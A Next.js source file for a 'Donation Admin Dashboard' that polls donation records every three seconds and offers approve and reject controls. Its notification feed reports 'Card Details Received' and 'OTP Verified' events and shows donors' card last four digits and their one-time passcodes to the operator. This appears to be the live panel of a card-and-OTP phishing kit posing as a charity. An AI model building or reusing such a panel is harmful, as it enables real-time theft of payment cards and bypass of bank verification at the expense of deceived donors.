'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { Donation, donationDb, AdminNotification } from '@/lib/donationDb';
import { OverviewTab } from '@/components/admin/OverviewTab';
import { AllDonationsTab } from '@/components/admin/AllDonationsTab';
import { StatusFilterTab } from '@/components/admin/StatusFilterTab';
import { SearchTab } from '@/components/admin/SearchTab';
import { NotificationsArchive } from '@/components/admin/NotificationsArchive';

type TabType = 'overview' | 'all' | 'approved' | 'pending' | 'rejected' | 'search' | 'notifications';

export default function AdminDashboard() {
  const router = useRouter();
  const [activeTab, setActiveTab] = useState<TabType>('overview');
  const [donations, setDonations] = useState<Donation[]>([]);
  const [notifications, setNotifications] = useState<AdminNotification[]>([]);
  const [showNotifications, setShowNotifications] = useState(false);
  const [isAuthorized, setIsAuthorized] = useState(false);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    // Check authorization
    const session = sessionStorage.getItem('adminSession');
    if (!session) {
      router.push('/admin');
      return;
    }

    try {
      const sessionData = JSON.parse(session);
      if (sessionData.loggedIn) {
        setIsAuthorized(true);

        const loadData = async () => {
          const [donationsData, notificationsData] = await Promise.all([
            donationDb.getAllDonations(),
            donationDb.getAllNotifications(),
          ]);

          setDonations(donationsData);
          setNotifications(notificationsData);
          setLoading(false);
        };

        loadData();
      } else {
        setLoading(false);
      }
    } catch {
      router.push('/admin');
    }

    // Listen for real-time notifications
    const handleNotification = (event: Event) => {
      const customEvent = event as CustomEvent;
      setNotifications(prev => [customEvent.detail, ...prev]);
    };

    window.addEventListener('donationNotification', handleNotification);

    // Auto-refresh dashboard every 3 seconds
    const refreshInterval = setInterval(async () => {
      const [donationsData, notificationsData] = await Promise.all([
        donationDb.getAllDonations(),
        donationDb.getAllNotifications(),
      ]);
      setDonations(donationsData);
      setNotifications(notificationsData);
    }, 3000);

    return () => {
      window.removeEventListener('donationNotification', handleNotification);
      clearInterval(refreshInterval);
    };
  }, [router]);

  const handleLogout = () => {
    sessionStorage.removeItem('adminSession');
    router.push('/admin');
  };

  const refreshDonations = async () => {
    const donationsData = await donationDb.getAllDonations();
    setDonations(donationsData);
  };

  const handleApprove = async (donationId: string) => {
    await donationDb.updateDonation(donationId, { status: 'approved' });
    await refreshDonations();
  };

  const handleReject = async (donationId: string) => {
    await donationDb.updateDonation(donationId, { status: 'rejected' });
    await refreshDonations();
  };

  const handleBulkApprove = async (donationIds: string[]) => {
    await Promise.all(
      donationIds.map(id => donationDb.updateDonation(id, { status: 'approved' }))
    );
    await refreshDonations();
  };

  const handleBulkReject = async (donationIds: string[]) => {
    await Promise.all(
      donationIds.map(id => donationDb.updateDonation(id, { status: 'rejected' }))
    );
    await refreshDonations();
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin inline-block w-8 h-8 border-4 border-blue-600 border-t-transparent rounded-full"></div>
          <p className="mt-4 text-gray-600">Loading...</p>
        </div>
      </div>
    );
  }

  if (!isAuthorized) {
    return null;
  }

  const unreadCount = notifications.filter(n => !n.read).length;

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <header className="bg-white shadow">
        <div className="max-w-7xl mx-auto px-4 py-6 flex justify-between items-center">
          <h1 className="text-3xl font-bold text-gray-800">Donation Admin Dashboard</h1>
          <div className="flex items-center gap-4">
            <div className="relative">
              <button
                onClick={() => setShowNotifications(!showNotifications)}
                className="relative p-2 text-gray-600 hover:text-gray-800"
              >
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" />
                </svg>
                {unreadCount > 0 && (
                  <span className="absolute top-1 right-1 inline-flex items-center justify-center px-2 py-1 text-xs font-bold leading-none text-white transform translate-x-1/2 -translate-y-1/2 bg-red-600 rounded-full w-5 h-5">
                    {unreadCount}
                  </span>
                )}
              </button>

              {/* Notifications Dropdown */}
              {showNotifications && (
                <div className="absolute right-0 mt-2 w-96 bg-white rounded-lg shadow-xl z-50 max-h-96 overflow-y-auto">
                  {notifications.length === 0 ? (
                    <div className="p-4 text-center text-gray-500">
                      No notifications yet
                    </div>
                  ) : (
                    <div>
                      {notifications.map(notification => (
                        <div
                          key={notification.id}
                          className={`border-b p-4 cursor-pointer hover:bg-gray-50 transition ${
                            !notification.read ? 'bg-blue-50' : ''
                          }`}
                          onClick={() => donationDb.markNotificationAsRead(notification.id)}
                        >
                          <div className="flex justify-between items-start mb-2">
                            <div className="flex-1">
                              <p className="font-semibold text-gray-800">
                                {notification.type === 'card_details' && '💳 Card Details Received'}
                                {notification.type === 'otp_verified' && '✓ OTP Verified'}
                                {notification.type === 'donation_created' && '🎁 Donation Created'}
                              </p>
                              <p className="text-sm text-gray-600 mt-1">{notification.donorName}</p>
                              <p className="text-sm text-gray-500 mt-1">{notification.message}</p>
                              {notification.cardLast4 && (
                                <p className="text-xs text-gray-600 mt-1 font-mono">
                                  Card ending: ****{notification.cardLast4}
                                </p>
                              )}
                              {notification.otpCode && (
                                <p className="text-xs text-gray-600 mt-1 font-mono">
                                  OTP Code: {notification.otpCode}
                                </p>
                              )}
                            </div>
                            <span className="text-xs text-gray-400 ml-2">
                              {new Date(notification.timestamp).toLocaleTimeString()}
                            </span>
                          </div>
                          <p className="text-xs font-semibold text-blue-600">
                            {notification.referenceNumber}
                          </p>
                          {!notification.read && (
                            <div className="mt-2 inline-block w-2 h-2 bg-red-600 rounded-full"></div>
                          )}
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )}
            </div>

            <button
              onClick={handleLogout}
              className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded-lg transition"
            >
              Logout
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 py-8">
        {/* Tabs */}
        <div className="bg-white rounded-lg shadow mb-6">
          <div className="flex border-b">
            <TabButton
              label="Overview"
              active={activeTab === 'overview'}
              onClick={() => setActiveTab('overview')}
            />
            <TabButton
              label="All Donations"
              active={activeTab === 'all'}
              onClick={() => setActiveTab('all')}
            />
            <TabButton
              label="Approved"
              active={activeTab === 'approved'}
              onClick={() => setActiveTab('approved')}
            />
            <TabButton
              label="Pending"
              active={activeTab === 'pending'}
              onClick={() => setActiveTab('pending')}
            />
            <TabButton
              label="Rejected"
              active={activeTab === 'rejected'}
              onClick={() => setActiveTab('rejected')}
            />
            <TabButton
              label="Search"
              active={activeTab === 'search'}
              onClick={() => setActiveTab('search')}
            />
            <TabButton
              label="Notifications"
              active={activeTab === 'notifications'}
              onClick={() => setActiveTab('notifications')}
            />
          </div>
        </div>

        {/* Tab Content */}
        {activeTab === 'overview' && (
          <OverviewTab donations={donations} />
        )}

        {activeTab === 'all' && (
          <AllDonationsTab
            donations={donations}
            onApprove={handleApprove}
            onReject={handleReject}
            onBulkApprove={handleBulkApprove}
            onBulkReject={handleBulkReject}
          />
        )}

        {activeTab === 'approved' && (
          <StatusFilterTab
            donations={donations.filter(d => d.status === 'approved')}
            status="approved"
            onApprove={handleApprove}
            onReject={handleReject}
            onBulkApprove={handleBulkApprove}
            onBulkReject={handleBulkReject}
          />
        )}

        {activeTab === 'pending' && (
          <StatusFilterTab
            donations={donations.filter(d => d.status === 'pending')}
            status="pending"
            onApprove={handleApprove}
            onReject={handleReject}
            onBulkApprove={handleBulkApprove}
            onBulkReject={handleBulkReject}
          />
        )}

        {activeTab === 'rejected' && (
          <StatusFilterTab
            donations={donations.filter(d => d.status === 'rejected')}
            status="rejected"
            onApprove={handleApprove}
            onReject={handleReject}
            onBulkApprove={handleBulkApprove}
            onBulkReject={handleBulkReject}
          />
        )}

        {activeTab === 'search' && (
          <SearchTab
            donations={donations}
            onApprove={handleApprove}
            onReject={handleReject}
            onBulkApprove={handleBulkApprove}
            onBulkReject={handleBulkReject}
          />
        )}

        {activeTab === 'notifications' && (
          <div className="bg-white rounded-lg shadow p-6">
            <NotificationsArchive />
          </div>
        )}
      </main>
    </div>
  );
}

interface TabButtonProps {
  label: string;
  active: boolean;
  onClick: () => void;
}

function TabButton({ label, active, onClick }: TabButtonProps) {
  return (
    <button
      onClick={onClick}
      className={`px-6 py-3 font-medium transition ${
        active
          ? 'text-blue-600 border-b-2 border-blue-600'
          : 'text-gray-600 hover:text-gray-800'
      }`}
    >
      {label}
    </button>
  );
}